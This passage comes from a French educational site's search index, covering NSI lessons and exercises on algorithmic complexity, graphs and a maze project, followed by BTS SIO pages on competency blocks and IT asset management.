chaines de caract\u00e8res. On va donc la cr\u00e9er nous-m\u00eame.  </p> <ul> <li>Question 3 :  Compl\u00e9ter la fonction clef_mot suivante pour qu'elle se comporte comme la docstring l'indique</li> </ul> <pre><code>def clef_mot(chaine:str)-&gt;str:\n    \"\"\"\n    Cette m\u00e9thode transforme la chaine de caract\u00e8re pass\u00e9e en param\u00e8tre en liste.\n    Elle la trie en utilisant la m\u00e9thode sort des listes Python.\n    Pour chaque caract\u00e8re de la liste :\n        Elle ajoute la caract\u00e8re dans une chaine de caract\u00e8re qui sera renvoy\u00e9e.\n    \"\"\"\n    s = \"\"\n    l = list(...)\n    l.sort()\n    for ... :\n        s = s + ...\n    return s\n</code></pre> <p>On sait donc que deux mots qui ont la m\u00eame clef sont des anagrammes.</p> <ul> <li>Question 4 : En d\u00e9duire une fonction <code>anagramme_via_clef</code> \u00e0 l'aide des pr\u00e9c\u00e9dentes, qui prend en param\u00e8tre deux chaines de caract\u00e8re et renvoie True si les deux caract\u00e8res sont des anagrammes, False sinon.</li> </ul> <p>On veut r\u00e9aliser l'\u00e9tude de la compl\u00e9xit\u00e9 sur un Lexique cons\u00e9quent. On rappelle que la compl\u00e9xit\u00e9 d\u00e9pend de la taille de l'entr\u00e9e. Pour ce faire, on va supposer que l'on traite la compl\u00e9xit\u00e9 temporelle qui est facilement mesurable en python. Gr\u00e2ce au module timeit on peut chronom\u00e9trer des actions. On va donc mesurer le temps n\u00e9cessaire pour trouver des anagrammes pour des lexiques de plus en plus grands et les reporter sur une courbe. Cette courbe sera trac\u00e9e gr\u00e2ce au module matplotlib. </p>"},{"location":"2024/Complexit%C3%A9%20algorithmique/sujet/#complexite-de-lalgorithme","title":"Complexit\u00e9 de l'algorithme","text":"<p>La fonction suivante <code>mesure_anagramme_clef</code> correspond \u00e0 la recherche du temps necessaire pour trouver les anagrammes d'un nombre de mots.</p> <pre><code>def mesure_anagramme_clef(nb_mots):\n    '''\n    R\u00e9alise la mesure du temps necessaire pour trouver \n    les anagrammes de i mots sur un lexique d'une taille i.\n\n    La m\u00e9thode employ\u00e9e correspond \u00e0 la cr\u00e9ation d'une clef \n    et de la recherche des clefs des autres mots auquel on le compare.\n\n    La complexit\u00e9 d\u00e9pend de la taille du Lexique.\n    '''\n    tab_mesures =[]\n\n    for i in range(0,nb_mots):\n\n        # Temps du d\u00e9but\n        temps_debut = timeit.default_timer()\n        for mot in LEXIQUE[:i]:\n            anagramme_1(mot, LEXIQUE[:i])\n\n        # Temps de fin\n        temps_fin = timeit.default_timer()\n        # Ajout de la dur\u00e9e dans le tableau : la case i correspond \u00e0 la \n        # recherche des anagrammes de i mots sur un lexique de i mots\n        tab_mesures.append(temps_fin-temps_debut)\n\n    print(str(sum(tab_mesures)) + \" secondes\")\n\n    # Cr\u00e9ation d'un graphique : l'abscisse correspond au nombre de mot\n    # et l'ordonn\u00e9e correspond au temps necessaire\n    plt.plot([i for i in range(nb_mots)], tab_mesures)\n    # Cr\u00e9ation d'un fichier png correspondant \u00e0 la courbe cr\u00e9\u00e9e gr\u00e2ce \u00e0 la m\u00e9thode plot.\n    plt.savefig(\"fig_clef.png\")\n    plt.clf()\n</code></pre> <p>Question 5 : Utiliser la fonction mesure_anagramme_clef sur une liste de 500 mots. Combien de temps cela a pris ?</p> <p>Question 6 : Ouvrez le fichier <code>fig_clef.png</code>. Quelle est la forme de la courbe? \u00c0 quelle complexit\u00e9 cela correspond ?</p> <p> </p>"},{"location":"2024/Complexit%C3%A9%20algorithmique/sujet/#partie-2-anagramme-grace-a-un-dictionnaire","title":"Partie 2 : Anagramme gr\u00e2ce \u00e0 un dictionnaire","text":"<p>Le probl\u00e8me de la m\u00e9thode pr\u00e9c\u00e9dente est que l'on parcourt le lexique pour chaque mot et on cherche dans cette liste tous les anagrammes. Cela veut dire que pour chaque \u00e9l\u00e9ment on parcourt chaque \u00e9l\u00e9ment alors que cela pourrait se faire en un seul passage dans le lexique.</p> <p>Une structure de donn\u00e9es que l'on peut employer pour trouver en un co\u00fbt unitaire serait l'emploi d'un dictionnaire. En effet, on peut parcourir une seule fois la liste, remplir petit \u00e0 petit le dictionnaire qui prend pour clef les clefs des mots obtenues \u00e0 l'aide de la fonction <code>clef_mot</code> r\u00e9alis\u00e9e pr\u00e9c\u00e9demment et en valeurs les mots associ\u00e9s.  L'acc\u00e8s \u00e0 une valeur d'un dictionnaire se fera en un co\u00fbt de un.</p> <p>Question 7 : Cr\u00e9er une fonction <code>dictionnaire_du_lexique</code> qui prend en param\u00e8tre un lexique et renvoie le dictionnaire associ\u00e9.</p> <p>Question 8 : En d\u00e9duire une fonction <code>anagramme_via_dictionnaire</code> qui prend en param\u00e8tre un mot et un dictionnaire et renvoie la liste des anagrammes d'un mot d'un lexique.</p> <p>Question 9 : En vous inspirant de la fonction <code>mesure_anagramme_clef</code>, en d\u00e9duire une fonction <code>mesure_anagrame_dico</code> qui correspond \u00e0 la mesure du temps necessaire pour trouver les anagrammes d'un mot. Cette fonction utilisera la m\u00e9thode de recherche d'anagramme via un dictionnaire. Celle-ci utilisera les fonctions cr\u00e9\u00e9es pr\u00e9c\u00e9demment et mettra le graphique cr\u00e9\u00e9 dans un fichier <code>fig_dico.png</code></p> <p>Question 10 : Regarder le fichier <code>fig_dico.png</code>, \u00e0 quelle fonction la courbe peut \u00eatre associ\u00e9e? \u00c0 quelle complexit\u00e9 cela se rapporte? Cela est-il meilleur qu'aux premi\u00e8res mesures?</p> <p>Question 11 : Quelle conclusion peut-on en d\u00e9duire entre l'impl\u00e9mantation d'un algorithme et sa complexit\u00e9?</p>"},{"location":"2024/Graphes/cours/","title":"Graphes","text":""},{"location":"2024/Graphes/cours/#introduction-aux-graphes","title":"Introduction aux graphes","text":""},{"location":"2024/Graphes/cours/#definitions","title":"D\u00e9finitions","text":"<p>Un graphe est une structure compos\u00e9e de : - Sommets (ou n\u0153uds) - Ar\u00eates (graphe non orient\u00e9) ou arcs (graphe orient\u00e9) reliant les sommets</p> <p>Types de graphes : - Non orient\u00e9 : les ar\u00eates n'ont pas de direction - Orient\u00e9 : les arcs ont une direction - Pond\u00e9r\u00e9 : les ar\u00eates/arcs ont un poids</p>"},{"location":"2024/Graphes/cours/#vocabulaire","title":"Vocabulaire","text":"<ul> <li>Degr\u00e9 d'un sommet : nombre d'ar\u00eates incidentes</li> <li>Chemin : suite d'ar\u00eates reliant deux sommets</li> <li>Cycle : chemin dont les extr\u00e9mit\u00e9s co\u00efncident</li> <li>Graphe connexe : il existe un chemin entre toute paire de sommets</li> </ul>"},{"location":"2024/Graphes/cours/#representations-informatiques","title":"Repr\u00e9sentations informatiques","text":""},{"location":"2024/Graphes/cours/#matrice-dadjacence","title":"Matrice d'adjacence","text":"<pre><code>class GrapheMatrice:\n    def __init__(self, n):\n        self.n = n  # nombre de sommets\n        self.matrice = [[0] * n for _ in range(n)]\n\n    def ajouter_arete(self, u, v):\n        self.matrice[u][v] = 1\n        self.matrice[v][u] = 1  # pour un graphe non orient\u00e9\n\n    def sont_adjacents(self, u, v):\n        return self.matrice[u][v] == 1\n</code></pre>"},{"location":"2024/Graphes/cours/#liste-dadjacence","title":"Liste d'adjacence","text":"<pre><code>class GrapheListe:\n    def __init__(self, n):\n        self.n = n\n        self.adj = [[] for _ in range(n)]\n\n    def ajouter_arete(self, u, v):\n        self.adj[u].append(v)\n        self.adj[v].append(u)  # pour un graphe non orient\u00e9\n\n    def voisins(self, u):\n        return self.adj[u]\n</code></pre>"},{"location":"2024/Graphes/cours/#parcours-de-graphes","title":"Parcours de graphes","text":""},{"location":"2024/Graphes/cours/#parcours-en-profondeur-dfs","title":"Parcours en profondeur (DFS)","text":"<pre><code>def dfs(graphe, sommet, visites=None):\n    if visites is None:\n        visites = set()\n\n    visites.add(sommet)\n    print(sommet, end=' ')\n\n    for voisin in graphe.voisins(sommet):\n        if voisin not in visites:\n            dfs(graphe, voisin, visites)\n</code></pre>"},{"location":"2024/Graphes/cours/#parcours-en-largeur-bfs","title":"Parcours en largeur (BFS)","text":"<pre><code>from collections import deque\n\ndef bfs(graphe, depart):\n    visites = set([depart])\n    file = deque([depart])\n\n    while file:\n        sommet = file.popleft()\n        print(sommet, end=' ')\n\n        for voisin in graphe.voisins(sommet):\n            if voisin not in visites:\n                visites.add(voisin)\n                file.append(voisin)\n</code></pre>"},{"location":"2024/Graphes/cours/#algorithmes-sur-les-graphes","title":"Algorithmes sur les graphes","text":""},{"location":"2024/Graphes/cours/#plus-court-chemin-dijkstra","title":"Plus court chemin (Dijkstra)","text":"<pre><code>def dijkstra(graphe, depart):\n    n = graphe.n\n    distances = [float('inf')] * n\n    distances[depart] = 0\n    visites = set()\n\n    while len(visites) &lt; n:\n        # Trouver le sommet non visit\u00e9 le plus proche\n        u = min((v for v in range(n) if v not in visites),\n                key=lambda x: distances[x])\n\n        visites.add(u)\n\n        for v, poids in graphe.voisins_ponderes(u):\n            if distances[u] + poids &lt; distances[v]:\n                distances[v] = distances[u] + poids\n\n    return distances\n</code></pre>"},{"location":"2024/Graphes/cours/#detection-de-cycles","title":"D\u00e9tection de cycles","text":"<pre><code>def a_cycle(graphe, sommet, visites=None, parent=None):\n    if visites is None:\n        visites = set()\n\n    visites.add(sommet)\n\n    for voisin in graphe.voisins(sommet):\n        if voisin not in visites:\n            if a_cycle(graphe, voisin, visites, sommet):\n                return True\n        elif parent != voisin:\n            return True\n\n    return False\n</code></pre>"},{"location":"2024/Graphes/cours/#exercices","title":"Exercices","text":""},{"location":"2024/Graphes/cours/#exercice-1-implementation","title":"Exercice 1 : Impl\u00e9mentation","text":"<p>Impl\u00e9mentez une classe Graphe avec les deux repr\u00e9sentations (matrice et liste) et des m\u00e9thodes pour : - Ajouter/supprimer des ar\u00eates - Calculer le degr\u00e9 d'un sommet - V\u00e9rifier si le graphe est connexe</p>"},{"location":"2024/Graphes/cours/#exercice-2-parcours","title":"Exercice 2 : Parcours","text":"<p>\u00c9crivez un programme qui : - Cr\u00e9e un graphe \u00e0 partir d'un fichier - Effectue un parcours en profondeur - Effectue un parcours en largeur - Compare les r\u00e9sultats</p>"},{"location":"2024/Graphes/cours/#exercice-3-plus-court-chemin","title":"Exercice 3 : Plus court chemin","text":"<p>Impl\u00e9mentez l'algorithme de Dijkstra pour : - Trouver le plus court chemin entre deux villes - Afficher le chemin et la distance totale</p>"},{"location":"2024/Graphes/cours/#exercice-4-applications","title":"Exercice 4 : Applications","text":"<p>R\u00e9solvez les probl\u00e8mes suivants avec des graphes : - Labyrinthe (chemin de sortie) - Coloration de carte - R\u00e9seau social (composantes connexes)</p>"},{"location":"2024/Graphes/cours/#applications-pratiques","title":"Applications pratiques","text":"<ul> <li>GPS et calcul d'itin\u00e9raires</li> <li>R\u00e9seaux sociaux</li> <li>R\u00e9seaux de transport</li> <li>Internet et routage</li> <li>Planification de t\u00e2ches</li> </ul>"},{"location":"2024/Graphes/exercices/","title":"Fiche d'exercices : Graphes","text":"<p>Exercice 1:</p> <p>On dispose du graphe ci-dessous.</p> <p> Ce graphe est compos\u00e9 de noeuds \\(A,B,C,D\\). Ils sont reli\u00e9s par un certain nombre d'ar\u00eates.</p> <ol> <li>Le graphe suivant est-il connexe? Justifier.</li> <li>Donner le chemin reliant tous les sommets partant B et allant vers D.</li> </ol> <p>Exercice 2:</p> <p>On dispose du graphe ci-dessous.  Il est compos\u00e9 des noeuds \\(B,C,D,F,T,N\\).</p> <ol> <li>Construire un tableau repr\u00e9sentant le degr\u00e9 des sommets du graphe.</li> <li>Ce graphe est-il connexe? Justifier.</li> <li>Ce graphe est-il complet? Justifier.</li> <li>On souhaite relier par un chemin tous les sommets du graphe. Cela est-il possible? Si oui, en donner un.</li> <li>Donner le chemin de poids minimal partant de B et allant \u00e0 N.</li> </ol> <p>Exercice 3:</p> <ol> <li>Dessiner un graphe complet \u00e0 4 sommets.</li> <li>Dessinez un graphe cyclique \u00e0 5 sommets.</li> <li>Dessiner un graphe \u00e0 5 sommets et que pour chaque sommet, leur degr\u00e9 entrant vaille 2 et leur degr\u00e9 sortant 2 aussi.</li> </ol> <p>Exercice 4:</p> <p>On consid\u00e8re les graphes orient\u00e9s ci-dessous. </p> <p> </p> <ol> <li>Pour chacun de ces graphes:</li> <li>Donner l'ordre du graphe</li> <li>Existe-t-il un circuit ?</li> <li> <p>un chemin eul\u00e9rien ? donner la longueur</p> </li> <li> <p>Ces graphes sont-ils connexes? </p> </li> </ol> <p>Exercice 5 :</p> <ol> <li>Dessiner le graphe non orient\u00e9 repr\u00e9sent\u00e9 par la matrice d'adjacence suivante :</li> </ol> <p>0 1 1 0 1 1 0 0 1 1 1 0 0 1 0 0 1 1 0 0 1 1 0 0 0</p> <ol> <li>Donner la liste d'adjacence de ce graphe.</li> <li>Existe-t-il une chaine eul\u00e9rienne dans ce graphe ?</li> </ol> <p> </p> <p>Exercice 6 :</p> <ol> <li>Dessiner le graphe orient\u00e9 repr\u00e9sent\u00e9 par la matrice d'adjacence suivante :</li> </ol> <p>0 1 1 0 1 0 0 1 0 1 0 1 1 0 0 0</p> <ol> <li> <p>Donner la liste d'adjacence de ce graphe.</p> </li> <li> <p>Dessiner le graphe orient\u00e9 repr\u00e9sent\u00e9 par la liste d'adjacence suivante :</p> </li> </ol> <p>0: 1, 2 1: 3, 4 2: 0, 3, 4 3: 4 4: 2, 3</p> <ol> <li>Donner la matrice d'adjacence de ce graphe.</li> </ol> <p> </p> <p>Exercice 7:</p> <p>Un groupe d'amis souhaite cr\u00e9er un graphe de leurs relations amicales pour d\u00e9terminer jusqu'\u00e0 quelle taille peut avoir un graphe de relations. Les amis ont fourni les informations suivantes sur leurs relations :</p> <ul> <li>Alice est amie avec Bob, Claire et David.</li> <li>Bob est ami avec Alice, Claire et \u00c9lise.</li> <li>Claire est amie avec Alice, Bob, David et \u00c9lise.</li> <li>David est ami avec Alice et Claire.</li> <li> <p>\u00c9lise est amie avec Bob et Claire.</p> </li> <li> <p>Quel type de graphe est le plus adapt\u00e9 pour repr\u00e9senter ce probl\u00e8me ?</p> </li> <li> <p>Repr\u00e9senter ce r\u00e9seau d'amiti\u00e9 sous forme de graphe en utilisant une matrice d'adjacence.</p> </li> <li> <p>Calculer le nombre total d'amiti\u00e9s dans ce groupe.</p> </li> <li> <p>Existe t-il un cycle dans ce graphe d'amiti\u00e9? Si oui, en donner un.</p> </li> <li> <p>Ajoutez un nouvel ami (Fran\u00e7ois) qui est ami avec Bob, David et \u00c9lise. Mettez \u00e0 jour le graphe en cons\u00e9quence.</p> </li> <li> <p>Calculez le degr\u00e9 moyen des amis dans le nouveau r\u00e9seau.</p> </li> <li> <p>Envisagez la possibilit\u00e9 qu'Alice ne soit plus amie avec Bob et Claire. Mettez \u00e0 jour le graphe suite \u00e0 ce changement.</p> </li> </ul> <p>Exercice 8:</p> <p>Un r\u00e9seau social s'interesse au suvi de ses utilisateurs. Chaque suivi n'est par sym\u00e9trique. Cela indique que si un utilisateur en suit un autre (\u00e0 la mani\u00e8re de Twitter).</p> <p>On dispose de la liste d'adjacence suivante :</p> <ul> <li>Sophie : Lucas, Emma, L\u00e9a</li> <li>Lucas : Sophie, Thomas, L\u00e9a</li> <li>Emma : Sophie, Thomas</li> <li>Thomas : Lucas, Emma</li> <li> <p>L\u00e9a : Sophie, Lucas</p> </li> <li> <p>Donner le graphe qui repr\u00e9sente ces relations de suivi.</p> </li> <li>Quel est ce type de graphe?</li> <li>Donner le degr\u00e9 entrant et sortant de chaque sommet du graphe.</li> <li>Donner les excentricit\u00e9 de chaque sommets du graphe.</li> <li>En d\u00e9duire le centre de ce graphe.</li> <li>Donner la distance du chemin le plus court de ce graphe.</li> <li>Donner le rayon et le diam\u00e8tre de ce graphe.</li> </ul>"},{"location":"2024/Graphes/exercices_parcours/","title":"Exercices parcours de graphe","text":"<p>Exercice 1 :</p> <p>On dispose du graphe G ci dessous (\u00e0 dessiner): 0: 2, 1, 3, 5 1: 3, 5, 4, 0, 2 2: 3, 0, 4, 1, 5 3: 1, 2, 5, 4, 0 4: 2, 5, 1, 3 5: 3, 1, 4, 2, 0</p> <p>1) Dresser la liste d'adjacence du graphe G. 2) Rappeler l'algorithme de parcours en largeur d'abord. 3) Rappeler l'algorithme de parcours en largeur d'abord. 4) R\u00e9aliser un parcours en profondeur sur le graphe G en prenant le sommet 1 comme sommet de d\u00e9part. 5) R\u00e9aliser un parcours en largeur sur le graphe G en prenant le sommet 0 comme sommet de d\u00e9part.</p> <p>Exercice 2 :</p> <p>On dispose du graphe G ci dessous (\u00e0 dessiner): 0: 1, 4 1: 3, 4, 2 2: 3, 0 3: 0, 4 4: 3, 2, 0, 1</p> <p>1) Dresser la liste d'adjacence du graphe G. 2) R\u00e9aliser un parcours en profondeur sur le graphe G en prenant le sommet 3 comme sommet de d\u00e9part. 3) R\u00e9aliser un parcours en largeur sur le graphe G en prenant le sommet 2 comme sommet de d\u00e9part.</p> <p>Exercice 3 :</p> <p>On dispose du graphe G ci dessous.</p> <p>0: 2, 4 1: 4, 3, 2 2: 4, 0, 3, 1 3: 1, 2, 4 4: 1, 2, 0, 3</p> <p>1) Gr\u00e2ce \u00e0 la classe Graphe Non-Orient\u00e9 cr\u00e9\u00e9e pr\u00e9c\u00e9demment, cr\u00e9er le graphe non orient\u00e9 correspondant. 2) \u00c9crire une m\u00e9thode parcours_largeur de la m\u00e9thode Graphe Non Orient\u00e9 qui impl\u00e9mante l'algorithme en langage naturel ci-dessous. 3) \u00c9crire une m\u00e9thode parcours_profondeur de la m\u00e9thode Graphe Non Orient\u00e9 qui impl\u00e9mante l'algorithme en langage naturel ci-dessous.</p> <pre><code>def parcours_profondeur(self, noeud_depart):\n    deja_visites &lt;- liste\n    a_visiter = Pile\n    a_visiter &lt;- ajouter l'\u00e9l\u00e9ment d\u00e9part \u00e0 la pile\n\n    tant que la pile n'est pas vide et tous les sommets ne sont pas visit\u00e9s:\n        sommet &lt;- d\u00e9piler la pile\n        afficher le sommet\n        pour chaque voisin du sommet:\n            si le voisin n'est pas d\u00e9j\u00e0 visit\u00e9:\n                a_visiter &lt;- ajouter le voisin \u00e0 la pile\n</code></pre> <pre><code>def parcours_largeur(self, noeud_depart):\n    deja_visites &lt;- liste\n    a_visiter = File\n    a_visiter &lt;- ajouter l'\u00e9l\u00e9ment d\u00e9part \u00e0 la pile\n\n    tant que la pile n'est pas vide et tous les sommets ne sont pas visit\u00e9s:\n        sommet &lt;- d\u00e9piler la file\n        afficher le sommet\n        pour chaque voisin du sommet:\n            si le voisin n'est pas d\u00e9j\u00e0 visit\u00e9:\n                a_visiter &lt;- ajouter le voisin \u00e0 la file\n</code></pre> <p>Exercice 4</p> <p>On dispose du graphe orient\u00e9 G ci-dessous:</p> <p>0 : 1,2 1 : 3,4 2 : 3 3 : 4 4 : \u2205</p> <p>1) Gr\u00e2ce \u00e0 la classe Graphe Orient\u00e9 cr\u00e9\u00e9e pr\u00e9c\u00e9demment, cr\u00e9er le graphe orient\u00e9 correspondant. 2) \u00c9crire une m\u00e9thode parcours_largeur de la m\u00e9thode Graphe Orient\u00e9. 3) \u00c9crire une m\u00e9thode parcours_profondeur de la m\u00e9thode Graphe Orient\u00e9.</p>"},{"location":"2024/Graphes/graphe/laby/","title":"Projet TNSI Sortir du Labyrinthe","text":""},{"location":"2024/Graphes/graphe/laby/#le-projet","title":"Le projet","text":"<p>Dans ce projet, on cherche \u00e0 concevoir puis implanter un algorithme permettant \u00e0 un robot de sortir de fa\u00e7on autonome d'un labyrinthe quelconque. Voici les differentes \u00e9tapes que vous allez r\u00e9aliser :</p> <ul> <li>Etape 1 : Repr\u00e9sentation d'un labyrinthe</li> <li>Etape 2 : Cr\u00e9ation d'une classe Labyrinthe</li> <li>Etape 3 : Cr\u00e9ation d'une fonction pour rechercher les d\u00e9placements possibles \u00e0 partir d'une case donn\u00e9e.</li> <li>Etape 4 : Recherche du chemin de fa\u00e7on autonome</li> <li>Etape 5 (facultative) : Construction d'une visualisation graphique</li> <li>Etape 6 (facultative) : Chargement de labyrinthes stock\u00e9es dans des fichiers textes</li> </ul> <p></p> <p> Il est fortement conseill\u00e9 de tester chaque m\u00e9thode juste apr\u00e8s l'avoir r\u00e9alis\u00e9e </p>"},{"location":"2024/Graphes/graphe/laby/#etape-n1","title":"Etape N\u00b01","text":"<p>On mod\u00e9lise un labyrinthe par un tableau \u00e0 deux dimensions \u00e0 n lignes et m colonnes avec n et m des entiers strictement positifs.</p> <p>Les lignes sont num\u00e9rot\u00e9es de 0 \u00e0 n - 1 et les colonnes de 0 \u00e0 m - 1. La case en haut \u00e0 gauche est rep\u00e9r\u00e9e par (0; 0) et la case en bas \u00e0 droite par (n - 1; m - 1).</p> <p>Dans ce tableau :</p> <ul> <li>0 repr\u00e9sente une case vide, hors case de d\u00e9part et arriv\u00e9e,</li> <li>1 repr\u00e9sente un mur,</li> <li>2 repr\u00e9sente le d\u00e9part du labyrinthe,</li> <li>3 repr\u00e9sente l'arriv\u00e9e du labyrinthe.</li> </ul> <p>Ainsi, en Python, le labyrinthe ci-dessous est repr\u00e9sent\u00e9 par le tableau de tableaux <code>tab1.</code></p> <p></p> <p>Le labyrinthe ci-dessous est cens\u00e9 \u00eatre repr\u00e9sent\u00e9 par le tableau de tableaux <code>tab2.</code> Cependant, dans ce tableau, un mur se trouve \u00e0 la place du d\u00e9part du labyrinthe. Ecrire une instruction permettant de placer le d\u00e9part au bon endroit dans <code>tab2.</code></p> <p></p>"},{"location":"2024/Graphes/graphe/laby/#etape-n2","title":"Etape N\u00b02","text":"<ol> <li>Cr\u00e9er la classe Labyrinthe. L'attribut sera la liste de listes <code>self.tab</code></li> <li>Cr\u00e9er la m\u00e9thode <code>affiche</code> qui affiche le labyrinthe.</li> <li>Cr\u00e9er les m\u00e9thodes <code>nblignes</code> et <code>nbcolonnes</code> de la classe Labyrinthe.</li> <li>Ecrire les m\u00e9thodes <code>depart</code> et <code>arrivee</code> qui renvoient respectivement la position de la case du d\u00e9part et de l'arriv\u00e9e sous la forme d'un tuple.</li> <li>Ecrire une m\u00e9thode <code>est_valide(self, i, j)</code> qui prend en param\u00e8tres deux nombres entiers i et j et qui renvoie <code>True</code> si le couple <code>(i, j)</code> correspond \u00e0 des coordonn\u00e9es valides pour un labyrinthe et <code>False</code> sinon. On donne ci-dessous des exemples d'appels.</li> </ol> <pre><code>&gt;&gt;&gt; lab1.est_valide(5, 2)\nTrue\n&gt;&gt;&gt; lab1.est_valide(-3, 12)\nFalse\n</code></pre> <ol> <li> <p>Ecrire une m\u00e9thode <code>nb_cases_vides</code> qui renvoie le nombre de cases vides d'un labyrinthe (comprenant donc l'arriv\u00e9e et le d\u00e9part).</p> <p>Par exemple, l'instruction <code>lab1.nb_cases_vides()</code> doit renvoyer la valeur 58.</p> </li> </ol>"},{"location":"2024/Graphes/graphe/laby/#etape-n3","title":"Etape N\u00b03","text":"<p>On va devoir parcourir les cases vides de proche en proche. Lors d'un tel parcours, afinn d'\u00e9viter de tourner en rond, on choisit de marquer les cases visit\u00e9es. Pour cela, on remplace la valeur d'une case visit\u00e9e dans le tableau repr\u00e9sentant le labyrinthe par la valeur 4.</p> <ol> <li>Ecrire la m\u00e9thode <code>est_visite(self, i ,j )</code> qui modifie l'attribut tab du labyrinthe en notant la case  <code>(i, j)</code> comme visit\u00e9e en lui attribuant le chiffre 4.</li> <li>On dit que deux cases d'un labyrinthe sont voisines si elles ont un c\u00f4t\u00e9 commun. On consid\u00e8re une m\u00e9thode <code>liste_voisines_libres(self, i, j)</code> qui prend en arguments deux entiers i et j repr\u00e9sentant les coordonn\u00e9es d'une case du labyrinthe. Cette fonction renvoie la liste des coordonn\u00e9es des cases voisines de la case de coordonn\u00e9es <code>(i, j)</code> qui sont valides, non visit\u00e9es et qui ne sont pas des murs. L'ordre des \u00e9l\u00e9ments de cette liste n'importe pas. </li> </ol> <p>On donne ci-dessous des exemples d'appels. <pre><code>&gt;&gt;&gt; lab1.liste_voisines(1, 2)\n[(1, 1), (1,3)] # peu importe l'ordre\n&gt;&gt;&gt; lab1.liste_voisines(5, 9)\n[(4, 9), (6,9), (5,10)]# peu importe l'ordre\n&gt;&gt;&gt; lab1.liste_voisines(5, 0)\n[(5, 1)]\n</code></pre></p> <ol> <li>Il faudra aussi une m\u00e9thode <code>case_fausse(self,x,y)</code> qui remplace la valeur de la case de coordonn\u00e9es <code>(i,j)</code> par 5 si elle a \u00e9t\u00e9 visit\u00e9e mais a men\u00e9 \u00e0 une impasse.</li> </ol>"},{"location":"2024/Graphes/graphe/laby/#etape-n4","title":"Etape N\u00b04","text":"<p>Dans la suite, on appellera solution du labyrinthe : un chemin allant du d\u00e9part \u00e0 l'arriv\u00e9e sans repasser par la m\u00eame case. Pour d\u00e9terminer la solution d'un labyrinthe, on parcourt les cases vides de proche en proche. On marquera la valeur d'une case visit\u00e9e dans le tableau repr\u00e9sentant le labyrinthe par la valeur 4. On rappelle aussi, qu'une case est dite libre si elle a pour valeur 1, 2 ou 3.</p> <p>L'objectif est d'\u00e9crire un programme qui d\u00e9termine s'il existe un chemin de l'entr\u00e9e vers la sortie en se d\u00e9pla\u00e7ant vers le haut, le bas, la gauche ou la droite (mais pas en diagonale).</p> <p>L'id\u00e9e est de parcourir le labyrinthe depuis l'entr\u00e9e, en utilisant une pile pour stocker le chemin parcouru au fur et \u00e0 mesure, pour pouvoir d\u00e9piler lorsque le chemin n'aboutit pas et red\u00e9marrer sur une autre voie.</p> <ol> <li>Un exemple sera sans doute plus efficace qu'un long discours, pour cela aller consulter le document.</li> <li>Si, au cours de l'ex\u00e9cution la pile se trouve vide, que cela signifie-t-il ?</li> <li>Ecrire et importer un module comportant une classe <code>Pile</code>avec les m\u00e9thodes dont vous aurez besoin.</li> <li>Ecrire  un programme permettant de trouver la solution d'un labyrinthe.</li> </ol>"},{"location":"BTS/bts/","title":"Bts","text":"BTS SI0 <p>Services Informatiques aux Organisations</p> <p>                     Fondamentaux de l'informatique et des services num\u00e9riques                 </p> Blocs de Comp\u00e9tences <p>Parcours de formation professionnalisante</p> \ud83d\udee0\ufe0f Bloc 1 - Support &amp; Services <p>                 Support et mise \u00e0 disposition de services informatiques, gestion du patrimoine et assistance utilisateurs             </p> B1.1 - Gestion du patrimoine informatique B1.2 - R\u00e9ponse aux incidents B1.3 - Pr\u00e9sence en ligne B1.5 - Gestion de projets \ud83d\udcda Cours \ud83c\udfaf Chemin Critique \ud83d\udcda M\u00e9thodes Agiles \ud83d\udcda Gestion des risques \ud83d\udcda ITIL \ud83d\udcbb Programmation &amp; D\u00e9veloppement <p>                 Bases de la programmation, langages de d\u00e9veloppement et outils de cr\u00e9ation d'applications             </p> \ud83d\udd12 Cyber S\u00e9curit\u00e9 <p>                 S\u00e9curit\u00e9 des syst\u00e8mes informatiques, r\u00e9seaux et services d'infrastructure             </p> B3.1 - Notion de risques et de menaces \ud83d\udcda Cours"},{"location":"BTS/B1/B1_1_Gestion_patrimoine/","title":"B1 1 Gestion patrimoine","text":"\ud83d\udcbc Gestion du Patrimoine Informatique <p>BTS SIO SLAM - Bloc 1 : Support et mise \u00e0 disposition de services informatiques</p> \ud83c\udfaf Qu'est-ce que le patrimoine informatique ? \ud83d\udccb D\u00e9finition Fondamentale              Le patrimoine informatique d\u00e9signe l'ensemble des ressources mat\u00e9rielles et logicielles d'une organisation, incluant les \u00e9quipements, les applications, les donn\u00e9es et les infrastructures r\u00e9seau.          \ud83d\udcbb Mat\u00e9riel                  Ordinateurs, serveurs, \u00e9quipements r\u00e9seau, p\u00e9riph\u00e9riques, composants \u00e9lectroniques et infrastructures physiques.              \ud83d\udcbf Logiciels                  Syst\u00e8mes d'exploitation, applications m\u00e9tier, outils de d\u00e9veloppement, licences et mises \u00e0 jour.              \ud83d\udcca Donn\u00e9es                  Bases de donn\u00e9es, fichiers, configurations, sauvegardes et informations critiques de l'entreprise.              \ud83c\udf10 Infrastructure                  R\u00e9seaux, serveurs, syst\u00e8mes de stockage, solutions cloud et architectures distribu\u00e9es.              \ud83d\udccb Inventaire et Documentation \ud83c\udfaf Objectifs de l'Inventaire              L'inventaire informatique permet de recenser, documenter et suivre tous les \u00e9l\u00e9ments du patrimoine pour optimiser la gestion, r\u00e9duire les co\u00fbts et assurer la conformit\u00e9.          1 Identification Recenser tous les \u00e9quipements et logiciels 2 Caract\u00e9risation Documenter les sp\u00e9cifications techniques 3 Localisation Identifier l'emplacement physique ou logique 4 Valorisation \u00c9valuer la valeur financi\u00e8re et strat\u00e9gique          \ud83d\udca1 Outils d'inventaire : Utilisez des solutions comme GLPI, OCS Inventory, Lansweeper ou des scripts personnalis\u00e9s pour automatiser la collecte d'informations sur votre parc informatique.               \ud83d\udca1 Bonnes pratiques : Automatisez l'inventaire avec des outils comme GLPI, OCS Inventory ou des scripts PowerShell pour maintenir des donn\u00e9es \u00e0 jour en temps r\u00e9el.      \ud83d\udd27 Gestion des Configurations (CMDB) \ud83c\udfaf Configuration Management Database              Une CMDB est une base de donn\u00e9es centralis\u00e9e qui stocke les informations sur tous les \u00e9l\u00e9ments de configuration (CI) et leurs relations dans l'infrastructure IT.          \ud83d\udd17 Relations                  Cartographie des d\u00e9pendances entre applications, serveurs, bases de donn\u00e9es et services m\u00e9tier.              \ud83d\udcc8 Tra\u00e7abilit\u00e9                  Suivi des changements, historique des modifications et impact des \u00e9volutions.              \u26a1 Automatisation                  D\u00e9couverte automatique des assets et mise \u00e0 jour en temps r\u00e9el des configurations.                       \ud83d\udca1 Solutions CMDB : ServiceNow, BMC Remedy, ManageEngine ServiceDesk Plus ou des solutions open source comme iTop permettent de centraliser et g\u00e9rer les informations de configuration.      \ud83d\udcca Gestion des Licences 